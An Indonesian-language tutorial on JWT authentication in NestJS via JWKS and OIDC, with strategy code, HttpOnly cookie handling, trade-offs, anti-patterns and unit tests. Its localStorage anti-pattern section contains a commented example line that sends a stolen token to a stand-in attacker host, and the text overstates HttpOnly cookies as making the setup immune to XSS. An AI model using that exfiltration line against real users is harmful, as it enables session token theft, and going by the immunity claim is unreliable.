# Otentikasi Stateless Kecepatan Tinggi via JWKS & OIDC

Pendekatan otentikasi Zero-Trust modern mengharuskan kita memisahkan Identity Provider (IdP) dari Resource Server. Menggunakan JSON Web Key Set (JWKS), layanan kita dapat memverifikasi token JWT yang ditandatangani secara asimetris (misal RS256) tanpa pernah berbagi rahasia (secret key) secara langsung, melainkan mengambil kunci publik dari endpoint IdP. Selain itu, penyimpanan token di sisi klien dilakukan menggunakan `HTTP-Only`, `Secure`, dan `SameSite=Strict` cookies, sehingga kebal terhadap serangan Cross-Site Scripting (XSS).

## Arsitektur & Alur Validasi JWKS

```ascii
+-------------------+                                      +--------------------------+
|                   | 1. Authenticate (User/Pass/MFA)      |                          |
|    Web Client     | -----------------------------------> | Identity Provider (OIDC) |
| (Browser/Mobile)  | <----------------------------------- |    (Auth0 / Keycloak)    |
|                   | 2. Set-Cookie: jwt=xxx; HttpOnly     |                          |
+-------------------+                                      +--------------------------+
          |                                                             ^
          | 3. Request + Cookie (jwt=xxx)                               | 4. Fetch JWKS
          v                                                             |    (.well-known/jwks.json)
+-------------------+                                                   |
|                   | --------------------------------------------------+
|   NestJS Guard    | 5. Verify Signature using Public Key from JWKS
| (Resource Server) | 6. Check Claims (iss, aud, exp)
|                   | 7. Allow / Deny Request
+-------------------+
          |
          | 8. Forward to Controller
          v
+-------------------+
| Business Logic    |
+-------------------+
```

## Implementasi Kode: TypeScript & NestJS 10+

### Konfigurasi JWKS Provider & JWT Strategy

```typescript
import { Injectable, UnauthorizedException, ExecutionContext } from '@nestjs/common';
import { PassportStrategy } from '@nestjs/passport';
import { ExtractJwt, Strategy } from 'passport-jwt';
import { passportJwtSecret } from 'jwks-rsa';
import { Request } from 'express'; // Atau FastifyRequest jika menggunakan Fastify

export interface JwtPayload {
  sub: string;
  iss: string;
  aud: string[];
  exp: number;
  iat: number;
  email?: string;
  roles?: string[];
}

@Injectable()
export class JwksJwtStrategy extends PassportStrategy(Strategy, 'jwt-jwks') {
  constructor() {
    super({
      // Mengambil token dari HTTP-Only Cookie bernama 'accessToken'
      jwtFromRequest: ExtractJwt.fromExtractors([
        (request: Request): string | null => {
          if (request && request.cookies) {
            const token = request.cookies['accessToken'];
            if (token && typeof token === 'string') {
               return token;
            }
          }
          return null;
        },
      ]),
      ignoreExpiration: false,
      audience: 'https://api.perusahaananda.com',
      issuer: 'https://idp.perusahaananda.com/',
      algorithms: ['RS256'],
      // Mengambil public key secara dinamis dan melakukan caching
      secretOrKeyProvider: passportJwtSecret({
        cache: true,
        rateLimit: true,
        jwksRequestsPerMinute: 5,
        jwksUri: 'https://idp.perusahaananda.com/.well-known/jwks.json',
      }),
    });
  }

  public async validate(payload: JwtPayload): Promise<JwtPayload> {
    if (!payload.sub) {
      throw new UnauthorizedException('Payload token tidak memiliki subject (sub) yang valid.');
    }
    // Tambahan validasi kustom (misalnya cek apakah user masih aktif di cache Redis lokal)
    return payload; // Ini akan disuntikkan ke request.user
  }
}
```

### Cookie Setter Middleware / Interceptor (Saat Login)

```typescript
import { Controller, Post, Res, Body, HttpCode, HttpStatus } from '@nestjs/common';
import { Response } from 'express';

interface LoginDto {
  code: string; // OIDC Authorization Code
}

@Controller('auth')
export class AuthController {
  
  @Post('callback')
  @HttpCode(HttpStatus.OK)
  public async handleOidcCallback(@Body() body: LoginDto, @Res({ passthrough: true }) res: Response): Promise<{ message: string }> {
    // 1. Tukar Authorization Code dengan Token dari IdP
    const accessToken = await this.exchangeCodeForToken(body.code);
    
    // 2. Set HTTP-Only Cookie
    res.cookie('accessToken', accessToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000, // 15 menit
      path: '/',
    });

    return { message: 'Otentikasi berhasil' };
  }

  private async exchangeCodeForToken(code: string): Promise<string> {
    // Logika panggilan HTTP eksternal ke OIDC Token Endpoint
    return 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1Njc4OTAifQ...'; 
  }
}
```

## Analisis Trade-Off

### Kelebihan
1. **Pemisahan Kredensial yang Sempurna:** Resource server (NestJS) tidak pernah menyimpan atau melihat password pengguna, hanya memvalidasi token kriptografis.
2. **Kekebalan Terhadap XSS:** Penggunaan `httpOnly` cookie memastikan JavaScript nakal di frontend (misalnya karena dependensi NPM yang terkompromi) tidak dapat mencuri token.
3. **Key Rotation Transparan:** Karena verifikasi signature menggunakan endpoint JWKS dinamis, IdP dapat melakukan rotasi kunci privat tanpa perlu downtime atau update konfigurasi di sisi NestJS.

### Kekurangan
1. **Ketergantungan Network untuk Kunci:** Jika endpoint JWKS dari IdP sedang down dan cache kunci kedaluwarsa, seluruh otentikasi di aplikasi akan gagal (Single Point of Failure eksternal).
2. **Kompleksitas Inisiasi Frontend:** Karena token ada di cookie, frontend yang berjalan di domain berbeda (Cross-Origin) memerlukan pengaturan CORS yang ketat dengan kredensial diizinkan (`Access-Control-Allow-Credentials: true`).
3. **Token Revocation Sulit:** Karena stateless, JWT yang belum kedaluwarsa tetap valid meski akun dihapus/diblokir, kecuali digabungkan dengan mekanisme Redis blocklist tambahan.

## Anti-Patterns Kritis

### Anti-Pattern 1: Menyimpan JWT di `localStorage` (Rentan XSS)
❌ **Salah:**
```typescript
// Frontend Code (React/Angular)
localStorage.setItem('token', response.data.accessToken);
// Jika ada XSS, penyerang cukup menjalankan:
// fetch('http://attacker.com/steal?token=' + localStorage.getItem('token'))
```

✅ **Benar:** Biarkan backend yang menangani token via header HTTP response `Set-Cookie` dengan flag `HttpOnly`. Frontend tidak perlu tahu nilai tokennya, hanya mengirim request dengan `credentials: 'include'`.

### Anti-Pattern 2: Tidak Memvalidasi `aud` (Audience) dan `iss` (Issuer)
❌ **Salah:** Menerima JWT hanya asalkan valid signature-nya. Ini memungkinkan skenario "Confused Deputy" di mana token yang dibuat untuk aplikasi A (misalnya forum) digunakan untuk mengakses aplikasi B (misalnya layanan perbankan) karena keduanya dari IdP yang sama.
```typescript
// Di dalam Passport Strategy - BURUK
ignoreExpiration: false,
algorithms: ['RS256'],
// Tidak ada validasi audience/issuer!
```

✅ **Benar:** Selalu definisikan `audience` dan `issuer` dengan ketat.
```typescript
audience: 'https://api.perusahaananda.com/banking-service',
issuer: 'https://idp.perusahaananda.com/',
```

## Production Edge Cases

1. **Throttling pada JWKS Endpoint:** Saat banyak instance NestJS start-up bersamaan, panggilan ke endpoint `.well-known/jwks.json` dapat melonjak tajam (Thundering Herd problem). Solusi: Gunakan `cache: true` dan limitasi konstan seperti `jwksRequestsPerMinute`.
2. **Skew Waktu (Clock Skew) Antar Server:** Waktu di server NestJS bisa sedikit lebih cepat atau lambat dibanding IdP. Jika IdP menerbitkan token yang masa aktifnya dimulai di masa depan (menurut jam NestJS), verifikasi gagal. Solusi: Kadang memerlukan konfigurasi toleransi *clock skew* di library verifikasi JWT (misal 5-30 detik).
3. **Cookie Size Limit Exceeded:** Jika menggunakan OIDC dengan banyak klaim (claims) peran atau atribut pengguna dalam token, JWT dapat membesar hingga melebihi batas ukuran cookie browser standar (umumnya ~4KB). Solusi: Jaga JWT sekecil mungkin (hanya `sub`, `roles` utama) dan ambil data sisanya via endpoint `/me` terpisah, atau pecah cookie.

## Unit / Integration Testing Suite

```typescript
import { Test, TestingModule } from '@nestjs/testing';
import { UnauthorizedException } from '@nestjs/common';
import { JwksJwtStrategy, JwtPayload } from './jwks-jwt.strategy';

describe('JwksJwtStrategy Security Suite', () => {
  let strategy: JwksJwtStrategy;

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [JwksJwtStrategy],
    }).compile();

    strategy = module.get<JwksJwtStrategy>(JwksJwtStrategy);
  });

  describe('validate()', () => {
    it('harus menerima token dengan payload yang valid (berisi sub)', async () => {
      const validPayload: JwtPayload = {
        sub: 'usr_123456',
        iss: 'https://idp.perusahaananda.com/',
        aud: ['https://api.perusahaananda.com'],
        exp: Math.floor(Date.now() / 1000) + 3600,
        iat: Math.floor(Date.now() / 1000),
      };

      const result = await strategy.validate(validPayload);
      expect(result).toEqual(validPayload);
      expect(result.sub).toBe('usr_123456');
    });

    it('harus menolak payload dan melemparkan UnauthorizedException jika sub tidak ada', async () => {
      const invalidPayload = {
        iss: 'https://idp.perusahaananda.com/',
        aud: ['https://api.perusahaananda.com'],
        exp: Math.floor(Date.now() / 1000) + 3600,
        iat: Math.floor(Date.now() / 1000),
      } as JwtPayload;

      await expect(strategy.validate(invalidPayload)).rejects.toThrow(UnauthorizedException);
      await expect(strategy.validate(invalidPayload)).rejects.toThrow('Payload token tidak memiliki subject (sub) yang valid.');
    });
    
    it('harus melemparkan error bila payload bernilai null atau undefined', async () => {
      await expect(strategy.validate(null as unknown as JwtPayload)).rejects.toThrow();
    });
  });
});
```
